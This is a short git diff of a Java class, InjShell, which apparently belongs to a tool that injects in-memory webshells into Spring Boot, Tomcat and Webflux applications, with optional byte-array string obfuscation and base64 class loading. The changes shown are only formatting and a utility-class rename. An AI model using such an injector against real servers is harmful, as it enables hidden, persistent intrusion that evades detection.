@@ -26,7 +26,7 @@ public class InjShell {
         name = name.substring(name.lastIndexOf(".") + 1);
 
         // 大多数 SpringBoot 项目使用内置 Tomcat
-        boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
+        boolean isTomcat = name.startsWith("T") || name.startsWith("Spring");
         boolean isWebflux = name.contains("Webflux");
 
         // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
@@ -187,7 +187,7 @@ public class InjShell {
     public static String converString(String target) {
         if (Config.IS_OBSCURE) {
             StringBuilder result = new StringBuilder("new String(new byte[]{");
-            byte[]        bytes  = target.getBytes();
+            byte[] bytes = target.getBytes();
             for (int i = 0; i < bytes.length; i++) {
                 result.append(bytes[i]).append(",");
             }
@@ -253,14 +253,13 @@ public class InjShell {
     }
 
 
-
     //类加载方式，因类而异
     public static String injectClass(Class clazz) {
 
         String classCode = null;
         try {
             //获取base64后的类
-            classCode = Util.getClassCode(clazz);
+            classCode = Utils.getClassCode(clazz);
 
         } catch (Exception e) {
             e.printStackTrace();
